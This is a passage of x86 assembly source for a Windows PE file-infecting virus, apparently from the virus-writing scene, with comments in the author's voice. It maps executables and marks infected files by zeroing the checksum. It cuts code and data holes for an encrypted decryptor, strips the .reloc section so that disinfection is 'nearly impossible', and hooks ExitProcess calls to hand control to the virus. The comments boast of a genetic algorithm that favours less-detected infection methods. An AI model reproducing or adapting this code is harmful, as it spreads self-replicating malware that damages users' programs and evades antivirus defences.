                xor     eax, eax
                mov     [ebx+58h], eax    ; Set the infection mark (the CRC of
                                          ; the executable to 0)
                xor     edi, edi    ; Set "NO_ERROR" flag
                jmp   @@NoError

     ;; If the file is already infected or the headers doesn't meet the
     ;; required characteristics, we jump here.
     @@Error4:  call    UndoChanges  ; Undo the changes to the file
                mov     edi, 1       ; Set "ERROR" flag

    @@NoError:  push    eax          ; Close the file mapping
                push    ecx
                push    edx ; APICALL_BEGIN
                mov     eax, [ebp+MappingAddress]
                push    eax
                call    dword ptr [ebp+RVA_UnmapViewOfFile]
                pop     edx
                pop     ecx
                pop     eax ; APICALL_END
                jmp   @@NoError3

     ;; We jump here if we failed while mapping a view of the file in memory
     @@Error3:  mov     edi, 1       ; Set "ERROR" flag
     @@NoError3:
                push    eax          ; Close the handle of the file mapping
                push    ecx
                push    edx ; APICALL_BEGIN
                mov     eax, [ebp+hMapping]
                push    eax
                call    dword ptr [ebp+RVA_CloseHandle]
                pop     edx
                pop     ecx
                pop     eax ; APICALL_END
                jmp   @@NoError2

    ;; Jump here if we failed while creating a file mapping object
    @@Error2:   mov     edi, 1       ; Set "ERROR" flag
    @@NoError2:
                push    eax          ; Let's truncate the file: we set it
                push    ecx          ; to the original size again if we
                push    edx          ; failed to infect
                xor     eax, eax
                push    eax ; push 0
                push    eax ; push 0
                or      edi, edi
                jnz   @@ThereWasAnError
                mov     eax, [ebp+FileSize]
                jmp   @@FixSize
    @@ThereWasAnError:
                mov     eax, [ebp+OriginalFileSize]
    @@FixSize:  push    eax
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetFilePointer]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                push    eax          ; Truncate the file
                push    ecx
                push    edx  ; APICALL_BEGIN
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetEndOfFile]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

   @@DontFixSize:
                push    eax          ; Restore the original file time from
                push    ecx          ; the data stored at the FindFile struct
                push    edx  ; APICALL_BEGIN

                mov     eax, [ebp+FindFileData]
                add     eax, 14h
                push    eax
                sub     eax, 8
                push    eax
                sub     eax, 8
                push    eax
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetFileTime]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                push    eax          ; Close the file handle
                push    ecx
                push    edx  ; APICALL_BEGIN
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_CloseHandle]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

     @@Error:   push    eax          ; Restore the file attributes
                push    ecx
                push    edx  ; APICALL_BEGIN
                mov     eax, [ebp+FileAttributes]
                push    eax
                mov     eax, [ebp+Addr_FilePath]
                push    eax
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END
     @@Error_:  ret
TouchFile       endp


;;; This is the main function to make holes. This function is capable of
;;; support two types of holes, being the first situated at .text or CODE
;;; section. The code can be easily modified to situate the holes at the end
;;; of other sections, but the current action is more stealthy. After this,
;;; if we remove .reloc section from the executable, we can't know how the
;;; host was before, so disinfection is nearly impossible.
PrepareFile     proc
                mov     eax, [ebp+MappingAddress]
                mov     ebx, [eax]
                and     ebx, 0FFFFh
                cmp     ebx, 0+'ZM'       ; Get the header. If the standard
                jnz   @@Error             ; win32 executable marks don't
                mov     ebx, [eax+18h]    ; exist ("MZ" and "PE") we finish
                and     ebx, 0FFh         ; with error (of course)
                cmp     ebx, 40h
                jnz   @@Error
                mov     ebx, [eax+3Ch]
                add     ebx, eax
                mov     ecx, [ebx]
                cmp     ecx, 0+'EP'
                jnz   @@Error

                mov     [ebp+HeaderAddress], ebx

                mov     ecx, [ebx+58h]    ; Get the file checksum at the
                or      ecx, ecx          ; header. if it's 0, it's already
                jz    @@Error             ; infected.

                mov     ecx, [ebx+4]      ; Get the type of executable
                and     ecx, 0FFFFh
                cmp     ecx, 014Ch        ; x86?
                jz    @@IA32              ; If so, jump to IA-32 infection

  ;; PE32+ for IA64     ; Reserved for future release (v2)
                jmp   @@Error  ; Exit and finish
; You can think: what's the point of making this check? The reason is that
; nowadays is more easy to find a server or a home PC with a FTP or HTTP
; server with files to get, and there are many of them that are for other
; types of processors, so better if we check the processor type. And, in the
; future, we'll have new processors like IA-64 (Itanium) and maybe others.

  ;; PE32 for x86
       @@IA32:  mov     ecx, [ebx+6]   ; Get the number of sections in the
                and     ecx, 0FFFFh    ; executable.
                ; ECX = Number of sections
                mov     edx, [ebx+14h] ; Get the start address of the
                and     edx, 0FFFFh    ; sections.
                add     edx, 18h
                add     edx, ebx
                mov     [ebp+StartOfSectionHeaders], edx
                xor     eax, eax                ; Initialize the interesting
                mov     [ebp+RelocHeader], eax  ; sections addresses.
                mov     [ebp+TextHeader], eax
                mov     [ebp+DataHeader], eax

        @@LoopSections:
                mov     eax, [edx]       ; Get the name of the section in the
                mov     esi, [edx+4]     ; pair EAX-ESI
                cmp     eax, 'ler.'      ; Is the name ".reloc"?
                jnz   @@LookForCode
                cmp     esi, 0+'co'
                jnz   @@NextSection
                mov     [ebp+RelocHeader], edx  ; Then, set the address
                jmp   @@NextSection
        @@LookForCode:
                cmp     eax, 'xet.'      ; Is the name ".text"?
                jnz   @@LookForCode2
                cmp     esi, 0+'t'
                jnz   @@NextSection
                mov     [ebp+TextHeader], edx ; Then, set the address of the
                jmp   @@NextSection           ; code header
        @@LookForCode2:
                cmp     eax, 'EDOC'      ; Is the name "CODE"?
                jnz   @@LookForData
                or      esi, esi
                jnz   @@NextSection
                mov     [ebp+TextHeader], edx ; Then set the address of the
                jmp   @@NextSection           ; code header
        @@LookForData:
                cmp     eax, 'tad.'      ; Is the name ".data"?
                jnz   @@LookForData2
                cmp     esi, 0+'a'
                jnz   @@NextSection
                mov     [ebp+DataHeader], edx ; Then set the address of the
                jmp   @@NextSection           ; data header
        @@LookForData2:
                cmp     eax, 'ATAD'      ; Is the name "DATA"?
                jnz   @@LookForData3
                or      esi, esi
                jnz   @@NextSection
                mov     [ebp+DataHeader], edx ; Then set the address of the
                jmp   @@NextSection           ; data header
        @@LookForData3:

        @@NextSection:
                mov     [ebp+LastHeader], edx ; Set the last header
                add     edx, 28h            ; Next header
                dec     ecx                 ; If it wasn't the last one,
                or      ecx, ecx            ; continue checking
                jnz   @@LoopSections

                xor     eax, eax              ; Initialize the addresses that
                mov     [ebp+ExitProcessAddress], eax    ; we need for making
                mov     [ebp+VirtualAllocAddress], eax   ; a correct infection
                mov     [ebp+GetProcAddressAddress], eax
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+TextHeader]   ; If we haven't retrieved a
                or      eax, eax                ; code or data section, we
                jz    @@Error                   ; exit with error
                mov     eax, [ebp+DataHeader]
                or      eax, eax
                jz    @@Error
                mov     eax, [ebp+RelocHeader]  ; IF we have .reloc section,
                or      eax, eax                ; we'll make section shifting.
                jz    @@NoRelocs    ; If not, try another alternative method.

                mov     eax, 3
                call    RandomBoolean_X000_3
                or      eax, eax    ; Although there is .reloc section, don't
                jz    @@NoRelocs2   ; make that infection always. Doing this,
                                    ; we have a not fixed way of infecting.
                         ; Moreover, it's selected by our genetic algorithm,
                         ; which makes that if it's not viable (i.e. it's
                         ; more detected) the probability is lower.

;; Now we are going to make section shifting. We use the relocation section
;; to update all the pointers that point to data that is going to be shifted
;; down,

                mov     eax, [ebp+RelocHeader]
                cmp     eax, [ebp+LastHeader]
                jnz   @@Error   ; Avoid .reloc section in the middle

                ;; Everything is OK to start!
                mov     eax, 1           ; Mark that we are doing the hole
                mov     [ebp+MakingFirstHole], eax  ; at the code section
                mov     esi, [ebp+TextHeader]
                mov     ecx, 1000h       ; Maximum size of decryptor
                call    UpdateHeaders    ; Make the hole.
                ; Returns:
                ; ECX = Unchanged
                ; EAX = Physical offset of created hole, or NULL if error
                ; EDI = RVA of hole
                mov     [ebp+RVA_TextHole], edi
                mov     [ebp+Phys_TextHole], eax
                mov     [ebp+TextHoleSize], ecx

                mov     eax, [ebp+ExitProcessAddress]
                or      eax, eax      ; If ExitProcess is not imported by the
                jz    @@Error         ; host, finish (undoing the changes)
             ;   mov     eax, [ebp+VirtualAllocAddress]
             ;   or      eax, eax
             ;   jz    @@Error
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax     ; Check the import of the GetProcAddress.
                jz    @@Error        ; If it's not imported, error
                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax  ; If the host doesn't import GetModuleHandle,
                jz    @@Error     ; finish with error

                mov     ebx, [ebp+HeaderAddress]
                add     [ebx+1Ch], ecx       ; Add the size of the hole to
                                             ; the size of code in the exec.
                                             ; header
                add     [ebp+FileSize], ecx  ; Add it to the track size too.

                xor     eax, eax                  ; Set that we are making
                mov     [ebp+MakingFirstHole], eax ; the second hole.
                mov     esi, [ebp+DataHeader]
                mov     ecx, [ebp+RoundedSizeOfNewCode]
                call    UpdateHeaders             ; Make the data hole
                mov     [ebp+RVA_DataHole], edi   ; Set the physical and
                mov     [ebp+Phys_DataHole], eax  ;  virtual addresses.

                mov     ebx, [ebp+HeaderAddress]  ; Now we are going to update
                                                  ; the addresses of the
                mov     eax, [ebp+ExitProcessAddress] ; functions. We don't
                add     eax, [ebx+34h]                ; need to check that
                mov     [ebp+ExitProcessAddress], eax ; they have a value
                                                   ; because we know that they
                mov     eax, [ebp+GetProcAddressAddress] ; have it. If not,
                add     eax, [ebx+34h]                ; we had exited when
                mov     [ebp+GetProcAddressAddress], eax ; making the first
                                                        ; hole (the code hole)
                mov     eax, [ebp+GetModuleHandleAddress]
                add     eax, [ebx+34h]
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+VirtualAllocAddress]
                or      eax, eax               ; If we have VirtualAlloc
                jz    @@DontAddBaseAddress     ; available, update it also
                add     eax, [ebp+34h]
                mov     [ebp+VirtualAllocAddress], eax
     @@DontAddBaseAddress:
                add     [ebx+20h], ecx         ; Increase the virtual size
                add     [ebp+FileSize], ecx    ; of the data in the file and
                                               ; the file size itself
                mov     esi, [ebp+RelocHeader]
                mov     eax, [esi+0Ch]
                mov     [ebx+50h], eax         ; Set the new image size of
                                               ; the executable.
                mov     edi, [esi+14h]
                mov     ecx, [ebp+FileSize]   ; Now set the physical size of
                sub     ecx, edi              ; the file in the FileSize var,
                mov     [ebp+FileSize], edi   ; so when closing the file
                                              ; mapping we'll set the new
                                              ; physical size (i.e. eliminate
                                              ; the .reloc section).
                add     edi, [ebp+MappingAddress]
                xor     eax, eax              ; Fill with 0s the .reloc
     @@Loop0:   mov     [edi], eax            ; section
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@Loop0

                mov     ecx, 28h       ; Now eliminate the .reloc header in
     @@Loop1:   mov     [esi], eax     ; the PE header
                add     esi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@Loop1

                mov     [ebx+0A0h], eax  ; Eliminate the relocation entry in
                mov     [ebx+0A4h], eax  ; the list of directories

                mov     eax, [ebx+06h]   ; Decrease the number of sections
                sub     eax, 1
                mov     [ebx+06h], eax
                mov     eax, [ebx+16h]   ; Set that the reloc info has been
                or      eax, 1           ; stripped from the file
                mov     [ebx+16h], eax

                mov     eax, 1000h    ; Set the maximum size of the decryptor
                mov     [ebp+MaxSizeOfDecryptor], eax ; to 1000h (the maximum
                                                      ; size we use for it)
                xor     eax, eax      ; Set "ALL OK" on returning
                ret
         @@Error:
                mov     eax, 1        ; Set "ERROR"!
                ret

;; This code is reached when the .reloc section exists, but we want to make
;; an infection as if there isn't a .reloc section. In this way the behaviour
;; of the infection method is not fixed.
     @@NoRelocs2:
                xor     eax, eax        ; Set the .reloc address to 0 as if
                mov     [ebp+RelocHeader], eax ; there wasn't .reloc section

     @@NoRelocs:
                xor     ecx, ecx        ; Retrieve the required function
                mov     edx, -1         ; addresses.
                call    UpdateImports

                mov     ecx, [ebp+HeaderAddress]      ; Check every function
                mov     eax, [ebp+ExitProcessAddress] ; address (and exit with
                or      eax, eax                      ; error if they couldn't
                jz    @@Error                         ; be retrieved) and get
                add     eax, [ecx+34h]                ; the final virtual addr.
                mov     [ebp+ExitProcessAddress], eax ; of every one, adding
                                                      ; the image base.
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax
                jz    @@Error
                add     eax, [ecx+34h]
                mov     [ebp+GetProcAddressAddress], eax

                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax
                jz    @@Error
                add     eax, [ecx+34h]
                mov     [ebp+GetModuleHandleAddress], eax

                mov     eax, [ebp+VirtualAllocAddress] ; If we haven't
                or      eax, eax                       ; VirtualAlloc, we don't
                jz    @@NoVirtualAlloc                 ; exit with error, but
                add     eax, [ecx+34h]                 ; then we have to
                mov     [ebp+VirtualAllocAddress], eax ; retrieve it in
     @@NoVirtualAlloc:                          ; runtime in the decryptor.

;; Pseudo-code of the algorithm we use to get a virtual hole in .text where
;; we can put the decryptor:
;;
;; If(PhysicalSize > VirtualSize)
;;      Phys_TextHoleAddr = VirtualSize;
;;      Virt_TextHoleAddr = VirtualSize;
;;      TextHoleSize = PhysicalSize - VirtualSize;
;;      If((TextHoleSize + VirtualSize) > NextVirtualAddress)
;;         Exit;
;;      VirtualSize += TextHoleSize;
;;      /* The hole is already made physically */
;; If(PhysicalSize <= VirtualSize)
;;    Phys_TextHoleAddr = PhysicalSize;
;;    Virt_TextHoleAddr = PhysicalSize;
;;    TextHoleSize = VirtualSize - PhysicalSize;
;;    If(TextHoleSize < MIN_SIZE)
;;         Exit;
;;    If(TextHoleSize > MAX_SIZE)
;;         TextHoleSize = MAX_SIZE;
;;    PhysicalSize += TextHoleSize;
;;    Add TextHoleSize to physical offset of all headers (from .text)
;;    Make a hole of size TextHoleSize at Phys_TextHoleAddr

                xor     eax, eax
                call    RandomBoolean_X004_7  ; Don't rely on fixed methods.
                and     eax, 0Fh    ; Using this method, one on every X
                or      eax, eax    ; infections will be forced to use the
                                    ; "no virtual hole" (and if it's not
                                    ; good, the genetic algorithm will make
                                    ; the adjust by "evolution").
                jz    @@HoleAtLastSection

                mov     ebx, [ebp+TextHeader]
                mov     eax, [ebx+10h]    ; Get the physical size
                cmp     eax, [ebx+08h]    ; Check against the virtual size
                jae   @@CheckPaddingSpace ; If Phys_Size > Virt_Size, jump
                add     eax, [ebx+14h]    ; Get the physical offset where the
                                          ; section ends
                mov     [ebp+Phys_TextHole], eax ; Set the physical address
                mov     eax, [ebx+10h]           ; Get the physical address
                add     eax, [ebx+0Ch]           ; Add the virtual size
                mov     [ebp+RVA_TextHole], eax  ; Size the virtual address of
                                                 ; the hole.
                mov     eax, [ebx+08h]      ; Get the virtual size
                sub     eax, [ebx+10h]      ; Subtract the physical size
                cmp     eax, 200h          ; If the hole has a size of at least
                jb    @@HoleAtLastSection  ; 512 bytes,
                cmp     eax, 80000000h     ; If it's signed (phys_size > virt)
                ja    @@Error              ; then exit with error
                cmp     eax, 1000h         ; If the size is greater than 4096
                jbe   @@TextHoleSizeOK     ; bytes, limit it to 4096.
                mov     eax, 1000h
      @@TextHoleSizeOK:
                mov     [ebp+MaxSizeOfDecryptor], eax ; Set the max size.
                mov     edx, ebx
                mov     ecx, [ebp+LastHeader]   ; Get the last header in ECX
      @@LoopAddPhysicalSize:
                cmp     edx, ebx               ; Add the physical size to the
                jz    @@NextAddPhysicalSize    ; physical offset of every
                add     [edx+14h], eax         ; section to update it and make
      @@NextAddPhysicalSize:                   ; the physical hole effective.
                cmp     edx, ecx
                jz    @@EndAddPhysicalSize
                add     edx, 28h
                jmp   @@LoopAddPhysicalSize

      @@EndAddPhysicalSize:                  ; Now we make the hole physically.
                mov     edx, [ebp+MappingAddress]
                mov     edi, edx
                add     edx, [ebx+14h]
                add     edx, [ebx+10h]
                add     edi, [ebp+FileSize]
                mov     esi, edi
                add     edi, eax
                add     [ebx+10h], eax
                mov     eax, 1000h
                add     [ebp+FileSize], eax
      @@LoopMakePhysicalHole:        ; Make the hole
                sub     edi, 4
                sub     esi, 4
                mov     eax, [esi]
                mov     [edi], eax
                cmp     edi, edx
                jnz   @@LoopMakePhysicalHole
                jmp   @@TextHoleMade

;; This method of infection uses the last section to put both decryptor and
;; virus data. It's the method that makes more heuristical alarms, but well,
;; it's a standard one. Since we don't touch the section flags (in fact, if
;; the section flags have a WRITABLE flag we exit) we avoid that alarm.
      @@HoleAtLastSection:
                mov     ebx, [ebp+LastHeader]
                mov     eax, [ebx+08h]
                add     eax, [ebx+0Ch]    ; Set the virtual code hole at the
                mov     [ebp+RVA_TextHole], eax ; virtual end of the last sec.
                mov     eax, [ebx+08h]      ; Physically, the same (but at the
                add     eax, [ebx+14h]      ; physical end)
                mov     [ebp+Phys_TextHole], eax
                mov     eax, 1000h          ; Set the maximum size of the
                mov     [ebp+MaxSizeOfDecryptor], eax  ; decryptor to 4096
                add     [ebx+08h], eax
                add     [ebx+10h], eax
                add     [ebp+FileSize], eax
                mov     eax, [ebx+24h]
;                or      eax, 20000020h ; If section is readable, is also
                               ; executable, since the exec flag is only
                               ; checked at startup (and we don't jump here
                               ; directly, since we use EPO).
                and     eax, 0FDFFFFFFh ; Eliminate the "DISCARDABLE" flag
                mov     [ebx+24h], eax

                jmp   @@GetDataHole


      @@CheckPaddingSpace:              ; Set the physical and virtual code
                mov     eax, [ebx+08h]  ; hole address. After that, check
                add     eax, [ebx+0Ch]  ; if we have enough padding space to
                mov     [ebp+RVA_TextHole], eax  ; make the decryptor there.
                mov     eax, [ebx+08h]
                add     eax, [ebx+14h]
                mov     [ebp+Phys_TextHole], eax
                mov     eax, [ebx+10h]
                sub     eax, [ebx+08h]  ; Set the alignment padding size as the
                mov     [ebp+MaxSizeOfDecryptor], eax ; maximum size of the
                cmp     eax, 200h              ; decryptor. If it's below 512,
                jb    @@HoleAtLastSection      ; make a last-section infection.
                mov     ecx, eax
                mov     eax, [ebx+10h]
                add     eax, [ebx+0Ch]     ; If the virtual address + physical
                cmp     eax, [ebx+28h+0Ch] ; size of the section overpasses the
                ja    @@Error              ; virtual size of the next section
                                           ; (overlapping it), exit with error.
                add     [ebx+08h], ecx     ; Add the virtual size of the hole.

;; Fill hole with 0s
      @@TextHoleMade:
                mov     ecx, [ebp+MaxSizeOfDecryptor]
                mov     edi, [ebp+Phys_TextHole]
                add     edi, [ebp+MappingAddress]
                xor     eax, eax
                and     ecx, 0FFFFFFFCh
      @@LoopFillHole:
                mov     [edi], eax  ; Overwrite the data of the hole with 0s.
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopFillHole

                mov     eax, [ebx+08h]  ; Set the new virtual size of the code
                mov     esi, [ebp+HeaderAddress] ; section as the virtual code
                mov     [esi+1Ch], eax           ; size in the PE header.

      @@GetDataHole:
                mov     ebx, [ebp+LastHeader]
                mov     eax, [ebp+RoundedSizeOfNewCode]
                add     [ebp+FileSize], eax
                mov     ecx, [ebx+24h]
                and     ecx, 80000000h
                or      ecx, ecx
                jnz   @@Error              ; If last header is writable, exit!
                mov     ecx, [ebx+10h]
                add     ecx, [ebx+14h]          ; Set the physical and virtual
                mov     [ebp+Phys_DataHole], ecx ; addresses of the data hole
                mov     ecx, [ebx+10h]
                add     ecx, [ebx+0Ch]
                mov     [ebp+RVA_DataHole], ecx
                add     eax, [ebx+10h]
                mov     [ebx+10h], eax           ; Set the new section sizes
                mov     [ebx+08h], eax

      @@AllHolesPrepared:
                mov     esi, [ebp+HeaderAddress] ; Set the new image size of
                mov     eax, [ebx+0Ch]           ; the executable in the PE
                add     eax, [ebx+08h]           ; header
                mov     [esi+50h], eax

;; Let's patch ExitProcess:
                mov     edx, [ebp+ExitProcessAddress] ; Get the virtual address
                mov     ebx, [ebp+TextHeader]         ; of the import table
                mov     esi, [ebx+14h]                ; where the function is.
                add     esi, [ebp+MappingAddress]
                mov     ecx, [ebx+10h]
                sub     ecx, 6

      @@LoopFindExitProcess:                  ; Search calls to that import
                mov     eax, [esi]            ; entry in the code of the
                and     eax, 0FFh             ; executable.
                cmp     eax, 0FFh
                jnz   @@NextInstruction
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 25h        ; Search for both CALL ExitProcess
                jz    @@JMPMemFound     ; and JMP ExitProcess (normally used
                cmp     eax, 15h        ; by Microsoft's Visual Studio
                jnz   @@NextInstruction ; compiler and Borland compiler
      @@JMPMemFound:                    ; respectivelly).
                mov     eax, [esi+2]
                cmp     eax, edx
                jnz   @@NextInstruction
      ;; ExitProcess found
                add     esi, 2           ; Patch that call/jmp to point to the
                push    edx              ; code hole where the decryptor is.
                mov     edx, [ebp+HeaderAddress] ; In this way, our virus gets
                mov     edx, [edx+34h]           ; the control when the exec
                add     edx, [ebp+RVA_TextHole]  ; exits.
                call    PatchExitProcess
                pop     edx
                add     esi, 4
      @@NextInstruction:
                add     esi, 1           ; Continue the search.
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopFindExitProcess

                xor     eax, eax         ; Return with no error.
                ret
PrepareFile     endp

;; This function is the one that makes the code and data holes when we infect
;; by shifting down the sections of the executable.
;;
;; ESI = Header of section where we make the hole at the end
;; ECX = Size of hole
UpdateHeaders   proc
;; Things to do:
;; 1) Update all offsets & code that point after the hole address using .reloc
;;   info
;; 2) Update virtual & physical offsets that point after the hole address
;;   referenced at section headers
;; 3) Update directory addresses at PE header
;; 4) Update all RVA references at resources tree
;; 5) Update all RVA references under import and export structures
;; They are not performed in this order!
                push    ecx                        ; Get what hole we are 
                mov     eax, [ebp+MakingFirstHole] ; making (code or data hole)
                or      eax, eax
                jz    @@MakingDataHole      ; If data hole, jump (put the hole
                                            ; at the beginning of the section)
                mov     eax, [esi+10h]
                cmp     eax, [esi+08h]  ; Fix the virtual size if it's smaller
                jbe   @@TextSizeOK      ; than the physical size.
                mov     [esi+08h], eax
        @@TextSizeOK:
                mov     edi, [esi+0Ch]
                add     edi, [esi+10h]  ; EDI = RVA of hole
                push    edi
                mov     eax, [esi+14h]
                add     eax, [esi+10h]  ; EAX = Physical address of hole
                push    eax
                jmp   @@BeginUpdates    ; All OK to start
        @@MakingDataHole:
                mov     edi, [esi+0Ch]
                push    edi             ; EDI = RVA of hole
                mov     eax, [esi+14h]
                push    eax

        @@BeginUpdates:

       ; Let's update some headers
       ; At this point:
       ; ECX = Size of hole
       ; ESI = Header of section containing the hole
       ; EDI = RVA of hole
        @@UpdateResources:
                mov     eax, [ebp+HeaderAddress]
                mov     ebx, [eax+88h]             ; Get the physical address
                or      ebx, ebx                   ; of the resources
                jz    @@UpdateImports
                call    TranslateVirtualToPhysical
                or      ebx, ebx
                jz    @@End                        ; Only virtual???

                mov     eax, [ebx+0Ch]    ; Get the number of resource entries
                and     eax, 0FFFFh       ; in EDX
                mov     edx, [ebx+0Eh]
                and     edx, 0FFFFh
                add     edx, eax
                or      edx, edx
                jz    @@UpdateImports

                ; EBX = Address of root
                ; EDX = Number of entries
                mov     eax, ebx          ; Update all the resources offsets
                add     eax, 10h
                call    UpdateResourceDir

        @@UpdateImports:
                call    UpdateImports     ; Update the imports (using the
                                          ; address of the hole at EDI and
                                          ; the size at ECX)

                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax                   ; Check if the required
                jz    @@End                        ; functions for a proper
;                 mov     eax, [ebp+VirtualAllocAddress] ; virus-work are
;                 or      eax, eax                       ; imported. If not,
;                 jz    @@End                            ; exit.
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax
                jz    @@End
                mov     eax, [ebp+ExitProcessAddress]
                or      eax, eax
                jz    @@End

        @@UpdateExports:                          ; Get the address of the
                mov     eax, [ebp+HeaderAddress]  ; exporting data (if exists)
                mov     ebx, [eax+78h]
                or      ebx, ebx                  ; If there aren't exports,
                jz    @@ExportsUpdated            ; update the next part
                call    TranslateVirtualToPhysical
                or      ebx, ebx                  ; Next part if error
                jz    @@ExportsUpdated
                mov     eax, [ebx+0Ch]        ; If the offsets in the header
                cmp     eax, edi              ; are situated AFTER the hole,
                jb    @@UpdateExportsOK_01    ; then we add the hole size
                add     [ebx+0Ch], ecx
        @@UpdateExportsOK_01:
                mov     eax, [ebx+1Ch]
                mov     edx, [ebx+14h]
                call    UpdateArrayOfRVAs     ; Update the RVAs in this array
                mov     eax, [ebx+1Ch]        ; Update the array RVA itself
                cmp     eax, edi
                jb    @@UpdateExportsOK_02
                add     [ebx+1Ch], ecx
        @@UpdateExportsOK_02:
                mov     eax, [ebx+20h]        ; Update the RVAs in this array
                mov     edx, [ebx+18h]
                call    UpdateArrayOfRVAs
                mov     eax, [ebx+20h]        ; Update the array RVA itself
                cmp     eax, edi
                jb    @@UpdateExportsOK_03
                add     [ebx+20h], ecx
        @@UpdateExportsOK_03:

        @@ExportsUpdated:

        ; Now we update all references inside code to things that point after
        ; the RVA of the hole we are creating. For that, we use .reloc info.
        @@UpdateCodeSection:
                push    esi
                mov     eax, [ebp+RelocHeader]  ; Get the relocation data
                mov     eax, [eax+14h]
                add     eax, [ebp+MappingAddress]
      @@LoopUpdate_00:
                mov     esi, [eax]          ; If it's void, end the fixing of
                or      esi, esi            ; the code
                jz    @@AllUpdated
                mov     edx, 8
      @@LoopUpdate_01:
                cmp     edx, [eax+4]     ; Did we updated all the references
                jae   @@PageUpdated      ; for this page? If it's so, go to
                                         ; update the next page.
                add     eax, edx
                mov     ebx, [eax]
                sub     eax, edx         ; Get the fix address
                and     ebx, 0FFFFh
                add     edx, 2
                cmp     ebx, 2FFFh       ; If it's not Intel ( <0x3000) don't
                jbe   @@LoopUpdate_01    ; fix it
                and     ebx, 0FFFh
                add     ebx, [eax]       ; EBX = RVA of address to relocate
                mov     esi, [ebp+MakingFirstHole]
                or      esi, esi          ; If we are making the data hole,
                jnz   @@UpdateCodeSec_Cont00    ; we add the text hole size
                cmp     ebx, [ebp+RVA_TextHole] ; if the update is after the
                jb    @@UpdateCodeSec_Cont00    ; the text hole
                add     ebx, [ebp+TextHoleSize]
      @@UpdateCodeSec_Cont00:
                call    TranslateVirtualToPhysical ; Get the address in the
                or      ebx, ebx              ; mapping for this virtual addr.
                jz    @@LoopUpdate_01
                push    eax
                push    edx                   ; Get the virtual address where
                mov     eax, [ebp+HeaderAddress] ; the DWORD we are updating
                mov     edx, [ebx]               ; points to.
                sub     edx, [eax+34h]
                cmp     edx, edi          ; If it points after the virtual
                jb    @@TranslateOK_02    ; address of the hole, update it
                add     [ebx], ecx
                add     edx, ecx
        @@TranslateOK_02:
;; Now we check if that DWORD points to ExitProcess. If it does, we make it
;; point to the code hole.
                mov     esi, [ebx-2]       ; Get if it's CALL or JMP
                and     esi, 0FFFFh
                cmp     esi, 15FFh
                jz    @@CheckExitProcess
                cmp     esi, 25FFh         ; If it's not CALL/JMP DWORD PTR,
                jnz   @@ItsNotExitProcess  ; don't take action!
        @@CheckExitProcess:
                cmp     edx, [ebp+ExitProcessAddress] ; Check it it's a CALL/
                jnz   @@ItsNotExitProcess             ; /JMP to ExitProcess
                mov     edx, [ebp+HeaderAddress]
                mov     edx, [edx+34h]
                add     edx, edi               ; Get the virtual address
                push    esi
                mov     esi, ebx
                call    PatchExitProcess       ; Patch the ExitProcess
                pop     esi

                xor     eax, eax ; Break possible APICALL_END mistranslation

                pop     edx
                pop     eax

                push    eax
                add     eax, edx
                push    edx
                mov     edx, [eax-2]      ; We anulate the .reloc reference
                and     edx, 0FFFF0000h   ; to avoid other update
                mov     [eax-2], edx
                pop     edx
                pop     eax
                jmp   @@LoopUpdate_01
      @@ItsNotExitProcess:
      @@TranslateOK:                      ; Get the next relocation value
                pop     edx
                pop     eax
                jmp   @@LoopUpdate_01
      @@PageUpdated:
                add     eax, [eax+4]
                jmp   @@LoopUpdate_00
      @@AllUpdated:
                pop     esi

;; Now we update some RVAs at the PE header. If we are making the code hole,
;; since it's at the end of the section, we update the data checking with
;; JB (the x86 conditional jump, not the whisky! And now make a mental image
;; of "checking the data with JB": me, with the computer, and a glass with ice
;; and JB in my hand checking opcodes XD). If we are making the
;; data hole, we check them with JBE (ooooh, that's not whisky!).

                mov     eax, [ebp+MakingFirstHole]
                mov     ebx, [ebp+HeaderAddress]
                cmp     [ebx+0Ch], edi    ; RVA to the (possible) symbol table
                jb    @@Fixed_01
                or      eax, eax
                jnz   @@NotFixed_01
                cmp     [ebx+0Ch], edi
                jz    @@Fixed_01
        @@NotFixed_01:
                add     [ebx+0Ch], ecx
        @@Fixed_01:
                cmp     [ebx+28h], edi    ; RVA to the entrypoint
                jb    @@Fixed_02
                or      eax, eax
                jnz   @@NotFixed_02
                cmp     [ebx+28h], edi
                jz    @@Fixed_02
        @@NotFixed_02:
                add     [ebx+28h], ecx
        @@Fixed_02:
                cmp     [ebx+2Ch], edi    ; RVA to the base of code
                jb    @@Fixed_03
                or      eax, eax
                jnz   @@NotFixed_03
                cmp     [ebx+2Ch], edi
                jz    @@Fixed_03
        @@NotFixed_03:
                add     [ebx+2Ch], ecx
        @@Fixed_03:
                cmp     [ebx+30h], edi    ; RVA to the base of data
                jb    @@Fixed_04
                or      eax, eax
                jnz   @@NotFixed_04
                cmp     [ebx+30h], edi
                jz    @@Fixed_04
        @@NotFixed_04:
                add     [ebx+30h], ecx
        @@Fixed_04:
                add     [ebx+50h], ecx    ; Increase the size of the image
                                          ; by the size of the hole.

       ; Now we update the virtual offsets of the directories

                mov     edx, [ebp+HeaderAddress]        ; Get the number of
                mov     edx, [edx+74h]                  ; directories
                mov     ebx, [ebp+HeaderAddress]
                add     ebx, 78h
                xor     eax, eax
       @@LoopDir_01:
                cmp     eax, 4            ; If it's the security directory,
                jz    @@NextDir_01        ; don't update the address
